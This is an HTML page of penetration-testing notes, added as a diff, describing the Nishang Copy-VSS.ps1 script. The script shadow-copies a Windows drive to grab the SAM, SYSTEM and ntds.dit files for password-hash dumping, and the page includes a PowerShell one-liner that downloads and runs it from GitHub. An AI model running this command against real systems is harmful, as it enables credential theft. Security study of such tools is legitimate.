@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Nishang framework: Copy-VSS.ps1 (Powershell 2.0+)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Nishang framework: Copy-VSS.ps1 (Powershell 2.0+)</h1><br />GitHub: <a
+      href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1" target="_blank">https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</a><br /><br />This
+    script automate the operations that we should do with the vssadmin command(seen in the chapter <a
+      href="lation--Windows_Authentication_attacks--Kerberos--dump_NTDS.dit_file_stored_on_the_Domain_Controller--vssadmin_(built-in_Powershell_3.0+).html">vssadmin
+      (built-in Powershell 3.0+)</a>) <br /> but it works with <span style="text-decoration:underline;">Powershell
+      2.0+</span><br />It copies the SAM file (and ntds.dit and SYSTEM hive if run on a Domain
+    Controller).<br /><br />This payload uses the VSS service (starts it if not running), creates a shadow of C: and
+    copies the SAM file which could be used to dump password hashes from it. If the script is run on a Domain
+    Controller, ntds.dit and SYSTEM hive are also copied.<br />The script must be run from an elevated shell.<br />The
+    default path used for SAM is C:\Windows\System32\config\SAM, for SYSTEM hive it is C:\Windows\System32\config\SYSTEM
+    and for<br />NTDS.dit it is C:\Windows\system32\ntds.dit. Sometimes the ntds.dit is present in other locations like
+    D:\NTDS or C:\Windows\NTDS and so on.<br />Use $ntdsSource variable to provide the directory.<br /><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1&#39;);Copy-VSS
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
